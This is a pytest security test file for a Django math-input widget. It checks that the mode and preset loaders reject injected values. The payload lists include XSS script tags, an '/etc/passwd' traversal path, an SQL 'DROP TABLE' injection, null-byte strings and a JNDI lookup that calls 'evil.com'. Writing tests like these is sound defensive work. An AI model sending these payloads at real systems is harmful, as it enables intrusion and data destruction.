"""
Security tests for Phase 2: Mode and Preset systems.

Tests injection prevention and validation in mode/preset systems.
"""
import pytest
from django import forms
from mathinput.widgets import MathInputWidget
from mathinput.modes import load_mode, is_valid_mode
from mathinput.presets import load_preset, is_valid_preset


@pytest.mark.security
def test_mode_config_injection_prevention():
    """
    What we are testing: Widget prevents injection via mode parameter
    Why we are testing: Security - prevent code injection through mode selection
    Expected Result: Invalid mode values are rejected or sanitized
    """
    # Test with potentially dangerous mode values
    dangerous_modes = [
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        "'; DROP TABLE modes; --",
        'regular_functions\'; alert("xss"); //',
        '${jndi:ldap://evil.com/a}',
    ]
    
    for dangerous_mode in dangerous_modes:
        # Widget should either reject or use default
        widget = MathInputWidget(mode=dangerous_mode)
        html = widget.render('equation', '')
        
        # Should not contain the dangerous string in rendered output
        assert dangerous_mode not in html
        
        # Should either use default or valid mode
        assert 'data-mode=' in html
        
        # Verify mode validation rejects invalid codes
        assert is_valid_mode(dangerous_mode) is False


@pytest.mark.security
def test_preset_config_injection_prevention():
    """
    What we are testing: Widget prevents injection via preset parameter
    Why we are testing: Security - prevent code injection through preset selection
    Expected Result: Invalid preset values are rejected or sanitized
    """
    # Test with potentially dangerous preset values
    dangerous_presets = [
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        "'; DROP TABLE presets; --",
        'algebra\'; alert("xss"); //',
        '${jndi:ldap://evil.com/a}',
    ]
    
    for dangerous_preset in dangerous_presets:
        # Widget should either reject or use default
        widget = MathInputWidget(preset=dangerous_preset)
        html = widget.render('equation', '')
        
        # Should not contain the dangerous string in rendered output
        assert dangerous_preset not in html
        
        # Should either use default or valid preset
        assert 'data-preset=' in html
        
        # Verify preset validation rejects invalid codes
        assert is_valid_preset(dangerous_preset) is False


@pytest.mark.security
def test_mode_loader_rejects_invalid_codes():
    """
    What we are testing: load_mode() raises error for invalid mode codes
    Why we are testing: Security - prevent loading arbitrary configurations
    Expected Result: ValueError raised for invalid mode codes
    """
    invalid_modes = [
        '../regular_functions',
        'regular_functions/../',
        'regular_functions\x00',
        '\x00regular_functions',
    ]
    
    for invalid_mode in invalid_modes:
        with pytest.raises(ValueError):
            load_mode(invalid_mode)


@pytest.mark.security
def test_preset_loader_rejects_invalid_codes():
    """
    What we are testing: load_preset() raises error for invalid preset codes
    Why we are testing: Security - prevent loading arbitrary configurations
    Expected Result: ValueError raised for invalid preset codes
    """
    invalid_presets = [
        '../algebra',
        'algebra/../',
        'algebra\x00',
        '\x00algebra',
    ]
    
    for invalid_preset in invalid_presets:
        with pytest.raises(ValueError):
            load_preset(invalid_preset)


@pytest.mark.security
def test_mode_code_whitelist_validation():
    """
    What we are testing: Mode system only accepts whitelisted mode codes
    Why we are testing: Security - prevent arbitrary code execution via mode loading
    Expected Result: Only valid mode codes from registry are accepted
    """
    from mathinput.modes import VALID_MODES
    
    # Valid modes should work
    for mode_code in VALID_MODES:
        assert is_valid_mode(mode_code) is True
        mode = load_mode(mode_code)
        assert mode['code'] == mode_code
    
    # Invalid modes should be rejected
    invalid_modes = ['nonexistent', 'test', 'admin', 'root']
    for invalid_mode in invalid_modes:
        assert is_valid_mode(invalid_mode) is False
        with pytest.raises(ValueError):
            load_mode(invalid_mode)


@pytest.mark.security
def test_preset_code_whitelist_validation():
    """
    What we are testing: Preset system only accepts whitelisted preset codes
    Why we are testing: Security - prevent arbitrary code execution via preset loading
    Expected Result: Only valid preset codes from registry are accepted
    """
    from mathinput.presets import VALID_PRESETS
    
    # Valid presets should work
    for preset_code in VALID_PRESETS:
        assert is_valid_preset(preset_code) is True
        preset = load_preset(preset_code)
        assert preset['code'] == preset_code
    
    # Invalid presets should be rejected
    invalid_presets = ['nonexistent', 'test', 'admin', 'root']
    for invalid_preset in invalid_presets:
        assert is_valid_preset(invalid_preset) is False
        with pytest.raises(ValueError):
            load_preset(invalid_preset)

